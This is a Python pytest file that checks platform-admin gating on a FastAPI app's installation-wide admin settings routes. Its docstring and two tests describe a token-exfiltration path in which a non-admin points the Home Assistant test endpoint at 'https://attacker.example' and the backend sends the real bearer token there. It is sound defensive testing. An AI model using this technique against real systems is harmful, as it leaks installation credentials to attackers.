"""Every installation-wide ``/admin/settings`` operation is platform-admin only (#1385).

The storage half of this router has carried ``require_platform_admin`` since
NFR-013 (see ``test_admin_settings_storage.py``); the Home-Assistant and
plant-identification halves did not, and resolved their caller through
``get_current_user`` alone. Any authenticated member of any tenant could
therefore read the installation's HA URL, replace its URL and token, and clear
the plant-identification provider for everyone — the #948 class, a guard opted
into at the call site and then not opted into by the siblings.

The most expensive of the seven is ``POST /home-assistant/test``, which is why
it gets a test of its own below rather than only a row in the parametrised
sweep. Its URL comes from the request body and its token falls back to the
*effective* one, so a caller who supplies a host they control and omits the
token has the backend dial that host with the installation's real long-lived
bearer token attached. ``validate_ha_url`` does not stop it: it blocks
link-local, cloud-metadata and (without opt-in) RFC1918 addresses, and a public
attacker-controlled address is meant to pass — it is an SSRF guard, not an
allowlist. Its own docstring names the caller it was written against ("admin,
or a mis-scoped lower-privilege user"); this file is what makes that true.

Why ``require_platform_admin`` and not ``require_admin_scope(TECHNICAL)``,
which REQ-049 §2.4 puts on the orthogonal administrative axis: that dependency
resolves a ``TenantContext`` through ``get_current_tenant``, so it is
tenant-bound. These routes carry no tenant in the path and write
installation-wide settings; gating them on a tenant scope would need a tenant
resolution invented for the purpose. The sibling ``admin/platform`` router
uses ``require_platform_admin``, and so does the storage half of this one.
"""

import ipaddress
from types import SimpleNamespace
from unittest.mock import MagicMock, patch

import pytest
from fastapi import FastAPI
from fastapi.exceptions import RequestValidationError
from fastapi.testclient import TestClient

from app.api.v1.admin.settings.router import router as settings_router
from app.common import auth as auth_mod
from app.common.auth import get_current_user
from app.common.dependencies import get_system_settings_service, get_tenant_service
from app.common.enums import TenantRole
from app.common.error_handlers import app_error_handler, validation_error_handler
from app.common.exceptions import KamerplanterError
from app.domain.models.system_settings import SystemSettings
from app.domain.services.system_settings_service import SystemSettingsService

#: Every operation that reads or changes installation-wide configuration, with a
#: body that is valid for it — so a refusal is the gate's doing and never a 422
#: from schema validation arriving first.
INSTALLATION_WIDE_OPERATIONS: list[tuple[str, str, dict | None]] = [
    ("GET", "/api/v1/admin/settings", None),
    ("PUT", "/api/v1/admin/settings/home-assistant", {"ha_url": "https://ha.example", "ha_timeout": 10}),
    ("POST", "/api/v1/admin/settings/home-assistant/test", {"ha_url": "https://ha.example"}),
    ("DELETE", "/api/v1/admin/settings/home-assistant", None),
    ("PUT", "/api/v1/admin/settings/plant-identification", {"plantnet_api_key": "k"}),
    ("POST", "/api/v1/admin/settings/plant-identification/test", {"plantnet_api_key": "k"}),
    ("DELETE", "/api/v1/admin/settings/plant-identification", None),
]

_OPERATION_IDS = [
    f"{method}{path.rsplit('/admin/settings', 1)[1] or '/'}" for method, path, _ in INSTALLATION_WIDE_OPERATIONS
]


def _user() -> SimpleNamespace:
    return SimpleNamespace(key="user_member")


def _env_defaults(env: MagicMock) -> None:
    """Environment fallbacks the shared response builder reads.

    ``ha_access_token`` carries a recognisable value: the exfiltration test
    below asserts it never leaves the process, and a blank token would make
    that assertion pass for the wrong reason.
    """
    env.ha_url = "https://ha.internal.example"
    env.ha_access_token = "eyJreal-installation-token-DO-NOT-LEAK"
    env.ha_timeout = 10
    env.plantnet_api_key = ""
    env.storage_backend = "local-fs"
    env.storage_local_fs_root = "/data/attachments"
    env.storage_local_fs_public_base_url = ""
    env.storage_s3_endpoint_url = ""
    env.storage_s3_region = ""
    env.storage_s3_bucket = ""
    env.storage_s3_access_key_id = ""
    env.storage_s3_secret_access_key = ""
    env.storage_s3_use_path_style = False
    env.storage_s3_kms_key_id = ""
    env.storage_s3_force_tls = True


def _service() -> tuple[SystemSettingsService, MagicMock]:
    repo = MagicMock()
    repo.get.return_value = SystemSettings()
    repo.upsert.side_effect = lambda s: s
    return SystemSettingsService(repo), repo


def _app(service: SystemSettingsService, tenant_service: MagicMock) -> FastAPI:
    """The router with its real gating.

    ``get_current_user`` is overridden because authentication is not what is
    under test; ``require_platform_admin`` is deliberately **not** overridden,
    so the dependency the routes actually declare is the one that decides.
    """
    app = FastAPI()
    app.include_router(settings_router, prefix="/api/v1")
    app.add_exception_handler(KamerplanterError, app_error_handler)  # type: ignore[arg-type]
    app.add_exception_handler(RequestValidationError, validation_error_handler)  # type: ignore[arg-type]
    app.dependency_overrides[get_system_settings_service] = lambda: service
    app.dependency_overrides[get_current_user] = _user
    app.dependency_overrides[get_tenant_service] = lambda: tenant_service
    return app


#: A public, globally-routable address. ``validate_ha_url`` resolves the host
#: through ``socket.getaddrinfo`` and refuses what does not resolve, so a made-up
#: attacker host is rejected in a test environment for the wrong reason —
#: ``URL_UNRESOLVABLE``, not the gate. Patching the resolver keeps the guard
#: itself in the path and feeds it the case it is designed to admit: a public
#: host that is neither private, loopback, link-local nor cloud-metadata.
#:
#: Not a TEST-NET address: Python's ``ipaddress`` reports 192.0.2.0/24,
#: 198.51.100.0/24 and 203.0.113.0/24 as ``is_private``, so ``_is_blocked_address``
#: refuses them and the exfiltration test below would have passed for the wrong
#: reason — the guard blocking a documentation range rather than the gate
#: blocking the caller. Measured, not assumed.
_PUBLIC_ADDRESS = [ipaddress.ip_address("93.184.216.34")]


def _tenant_service(*, platform_admin: bool) -> MagicMock:
    """A membership lookup that answers the way ``is_platform_admin`` reads it.

    A platform admin is a ``lead`` membership in the technical ``platform``
    tenant (REQ-049 §2.5). The non-admin modelled here is a ``lead`` in a
    *domain* tenant — the strongest domain role there is — and holds no
    membership in ``platform``. That is what makes the refusal meaningful: it
    shows the gate reads the platform tenant rather than merely the rank, which
    a mock returning ``None`` for every lookup could not distinguish.

    Keyed on the requested tenant rather than a flat ``return_value`` for the
    same reason: a lookup that answers identically whatever it is asked cannot
    tell a right answer from a lucky one.
    """
    service = MagicMock()
    lead = SimpleNamespace(role=TenantRole.LEAD, is_active=True)

    def _membership(_user_key: str, tenant: str):
        if tenant == "platform":
            return lead if platform_admin else None
        return lead

    service.get_membership.side_effect = _membership
    return service


@pytest.mark.parametrize(("method", "path", "body"), INSTALLATION_WIDE_OPERATIONS, ids=_OPERATION_IDS)
def test_plain_member_is_refused(monkeypatch, method: str, path: str, body: dict | None):
    """A member who is not a platform admin receives 403 on every operation."""
    monkeypatch.setattr(auth_mod.settings, "kamerplanter_mode", "full")
    service, repo = _service()
    with patch("app.domain.services.system_settings_service.env_settings") as env:
        _env_defaults(env)
        client = TestClient(_app(service, _tenant_service(platform_admin=False)))
        resp = client.request(method, path, json=body)

    assert resp.status_code == 403, f"{method} {path} answered {resp.status_code}"
    # Nothing was written, and nothing was disclosed on the way to the refusal.
    repo.upsert.assert_not_called()
    assert "ha.internal.example" not in resp.text
    assert "eyJreal-installation-token-DO-NOT-LEAK" not in resp.text


@pytest.mark.parametrize(("method", "path", "body"), INSTALLATION_WIDE_OPERATIONS, ids=_OPERATION_IDS)
def test_platform_admin_is_admitted(monkeypatch, method: str, path: str, body: dict | None):
    """The control: without it, a gate that refuses everyone passes the sweep above.

    Only the gate's verdict is asserted — that the request got past it. The
    two ``/test`` operations dial an external host, which is patched out here;
    what they answer is the subject of their own tests, not of this one.
    """
    monkeypatch.setattr(auth_mod.settings, "kamerplanter_mode", "full")
    service, _repo = _service()
    with (
        patch("app.domain.services.system_settings_service.env_settings") as env,
        patch("app.api.v1.admin.settings.router.httpx.get") as http_get,
        patch("app.api.v1.admin.settings.router._sync_ha_notification_channel"),
        patch("app.common.url_safety._resolved_addresses", return_value=_PUBLIC_ADDRESS),
    ):
        _env_defaults(env)
        http_get.return_value = MagicMock(
            json=MagicMock(return_value={"message": "API running.", "version": "2026.9"}),
            status_code=200,
        )
        client = TestClient(_app(service, _tenant_service(platform_admin=True)))
        resp = client.request(method, path, json=body)

    assert resp.status_code != 403, f"{method} {path} refused a platform admin"


@pytest.mark.parametrize(("method", "path", "body"), INSTALLATION_WIDE_OPERATIONS, ids=_OPERATION_IDS)
def test_light_mode_admits_the_sole_operator(monkeypatch, method: str, path: str, body: dict | None):
    """REQ-027: light mode has no platform tenant; the anonymous user is the operator.

    Asserted for the same reason as the control above — and additionally that
    the membership lookup is never consulted, because in light mode there is
    nothing to consult.
    """
    monkeypatch.setattr(auth_mod.settings, "kamerplanter_mode", "light")
    service, _repo = _service()
    tenant_service = MagicMock()
    with (
        patch("app.domain.services.system_settings_service.env_settings") as env,
        patch("app.api.v1.admin.settings.router.httpx.get") as http_get,
        patch("app.api.v1.admin.settings.router._sync_ha_notification_channel"),
        patch("app.common.url_safety._resolved_addresses", return_value=_PUBLIC_ADDRESS),
    ):
        _env_defaults(env)
        http_get.return_value = MagicMock(
            json=MagicMock(return_value={"message": "API running.", "version": "2026.9"}),
            status_code=200,
        )
        client = TestClient(_app(service, tenant_service))
        resp = client.request(method, path, json=body)

    assert resp.status_code != 403, f"{method} {path} refused the light-mode operator"
    tenant_service.get_membership.assert_not_called()


def test_plain_member_cannot_make_the_backend_dial_a_host_with_the_installation_token(monkeypatch):
    """The exfiltration case, asserted at the socket rather than at the status code.

    ``POST /home-assistant/test`` resolves ``token = body.ha_access_token or
    effective["ha_access_token"]``. A caller who supplies a host and omits the
    token therefore has the installation's real token attached to a request to
    a host of their choosing. The URL used here is public and well-formed, so
    ``validate_ha_url`` admits it — the refusal has to come from the gate.

    The assertion is that ``httpx.get`` is never reached. A 403 alone would
    also pass if the refusal happened *after* the call.
    """
    monkeypatch.setattr(auth_mod.settings, "kamerplanter_mode", "full")
    service, _repo = _service()
    with (
        patch("app.domain.services.system_settings_service.env_settings") as env,
        patch("app.api.v1.admin.settings.router.httpx.get") as http_get,
        patch("app.common.url_safety._resolved_addresses", return_value=_PUBLIC_ADDRESS),
    ):
        _env_defaults(env)
        client = TestClient(_app(service, _tenant_service(platform_admin=False)))
        resp = client.post(
            "/api/v1/admin/settings/home-assistant/test",
            json={"ha_url": "https://attacker.example"},
        )

    assert resp.status_code == 403
    http_get.assert_not_called()


def test_the_exfiltration_path_is_real_for_a_caller_the_gate_admits(monkeypatch):
    """Falsifies the test above: without the gate, the token does leave.

    If this fails, the mechanism the previous test guards against does not
    exist the way it is described, and that test is proving nothing. Asserted
    positively here — the admin is the caller who is *supposed* to be able to
    point the backend at a host, so this is the intended behaviour, not a
    defect. It is the same behaviour a plain member must not reach.
    """
    monkeypatch.setattr(auth_mod.settings, "kamerplanter_mode", "full")
    service, _repo = _service()
    with (
        patch("app.domain.services.system_settings_service.env_settings") as env,
        patch("app.api.v1.admin.settings.router.httpx.get") as http_get,
        patch("app.common.url_safety._resolved_addresses", return_value=_PUBLIC_ADDRESS),
    ):
        _env_defaults(env)
        http_get.return_value = MagicMock(
            json=MagicMock(return_value={"message": "API running."}),
            status_code=200,
        )
        client = TestClient(_app(service, _tenant_service(platform_admin=True)))
        client.post(
            "/api/v1/admin/settings/home-assistant/test",
            json={"ha_url": "https://attacker.example"},
        )

    http_get.assert_called_once()
    called_url, called_kwargs = http_get.call_args[0][0], http_get.call_args[1]
    assert called_url.startswith("https://attacker.example")
    assert called_kwargs["headers"]["Authorization"] == "Bearer eyJreal-installation-token-DO-NOT-LEAK"
